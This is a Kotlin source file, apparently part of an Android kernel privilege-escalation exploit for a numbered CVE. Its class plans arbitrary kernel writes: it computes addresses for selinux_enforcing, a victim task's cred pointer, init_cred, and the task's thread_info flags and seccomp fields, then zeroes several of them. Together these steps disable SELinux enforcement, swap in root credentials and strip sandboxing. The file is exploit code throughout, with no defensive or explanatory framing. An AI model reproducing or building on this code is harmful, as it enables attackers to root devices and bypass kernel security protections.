package com.ghostlock.app.backend.cve43499.generator

import com.ghostlock.app.backend.cve43499.flow.Cve43499WritePlanner

/**
 * debug 目标事实驱动的写请求规划器（R3d）。
 *
 * 所有 target 派生式都来自 legacy 只读参考：
 * - W1：`data_alias(selinux_enforcing)`（very_legacy `run_w1_stage`）；
 * - W1b：`W1 页基址 + multicast buffer_size`（退役 `w1_scratch_repair`）；
 * - W2：`victim task_struct + task_struct.cred`（legacy `w2`）；
 * - W2b：`data_alias(init_cred) + 8`（legacy2 `w2_fast_repair_*`）；
 * - W3-0：`task + comm`；W3：`task + thread_info.flags` / `task + seccomp`
 *   （legacy `w3`，leaf 方向由探针决定是否 -8）。
 *
 * @param context generator 上下文（debug 目标事实 + 执行参数 + 本进程 pid）。
 * @note 阶段：R3d；纯函数，不触 Native、不持有 token。
 */
internal class Cve43499DebugWritePlanner(
    private val context: Cve43499GeneratorContext,
) : Cve43499WritePlanner {
    override fun w1(): Cve43499WriteRequest = context.w1WriteRequest()

    override fun w1b(w1PageBase: Long): Cve43499WriteRequest =
        context.w1bWriteRequest(w1PageBase)

    override fun credential(victimTaskAddress: Long): Cve43499WriteRequest =
        context.credentialWriteRequest(victimTaskAddress)

    override fun fastRepair(): Cve43499WriteRequest = context.fastRepairWriteRequest()

    override fun w3CommProbe(victimTaskAddress: Long): Cve43499WriteRequest =
        zeroLeaf(
            addExact(
                victimTaskAddress,
                context.debug.taskStruct.comm,
                "w3:comm-target-overflow",
            ),
        )

    override fun w3Flags(
        victimTaskAddress: Long,
        leafToTargetPlus8: Boolean,
        threadInfoFlagsOffset: Long,
    ): Cve43499WriteRequest = zeroLeaf(
        leafAdjusted(
            addExact(
                victimTaskAddress,
                threadInfoFlagsOffset,
                "w3:flags-target-overflow",
            ),
            leafToTargetPlus8,
        ),
    )

    override fun w3SeccompMode(
        victimTaskAddress: Long,
        leafToTargetPlus8: Boolean,
    ): Cve43499WriteRequest = zeroLeaf(
        leafAdjusted(
            addExact(
                victimTaskAddress,
                context.debug.taskStruct.seccomp,
                "w3:seccomp-target-overflow",
            ),
            leafToTargetPlus8,
        ),
    )

    /**
     * @param target 基准目标地址。
     * @param leafToTargetPlus8 true=leaf 写落在 target+8，故把目标前移 8。
     * @return 调整后的目标。
     * @throws Cve43499GeneratorException 减法溢出。
     */
    private fun leafAdjusted(target: Long, leafToTargetPlus8: Boolean): Long =
        if (leafToTargetPlus8) addExact(target, -8L, "w3:leaf-adjust-overflow") else target

    /**
     * @param target 零写目标。
     * @return Zero leaf 写请求（preserve_child=false）。
     */
    private fun zeroLeaf(target: Long): Cve43499WriteRequest = context.writeRequest(
        target = target,
        mode = Cve43499WriteMode.ZERO,
        preserveChild = false,
    )
}
